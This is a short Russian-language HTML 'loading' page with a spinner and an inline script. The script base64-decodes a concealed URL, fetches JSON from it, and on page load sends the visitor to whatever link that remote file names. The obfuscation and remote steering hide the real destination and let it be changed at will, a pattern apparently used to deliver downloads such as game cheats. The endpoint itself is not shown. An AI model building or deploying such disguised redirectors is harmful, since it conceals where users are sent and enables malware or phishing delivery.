<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Перенаправление...</title>
    <style>
        body { font-family: Arial, text-align: center; padding: 50px; }
        .loader { 
            border: 5px solid #f3f3f3; 
            border-top: 5px solid #3498db;
            border-radius: 50%; 
            width: 50px; 
            height: 50px; 
            animation: spin 1s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
    </style>
</head>
<body>
    <h1>Загрузка...</h1>
    <div class="loader"></div>
    <p id="status">Пожалуйста, подождите.</p>
    <p id="error" style="color: red;"></p>

    <script>
        async function redirect() {
            try {
                document.getElementById('status').textContent = 'Получение данных...';
                const e = "aHR0cHM6Ly9nZXRzb2xhcmEuZGV2L2FwaS9lbmRwb2ludC5qc29u";
                const t = atob(e);
                const response = await fetch(t);
                
                if (!response.ok) throw new Error(`Ошибка: ${response.status}`);
                
                const data = await response.json();
                const n = Object.keys(data).find(k => k.toLowerCase().includes('url'));
                
                if (!n) throw new Error('Ссылка не найдена');
                
                window.location.href = data[n];
                
            } catch (error) {
                document.getElementById('error').innerHTML = `Ошибка: ${error.message}`;
                document.getElementById('status').textContent = 'Обновите страницу (F5).';
            }
        }

        redirect();
    </script>
</body>
</html>
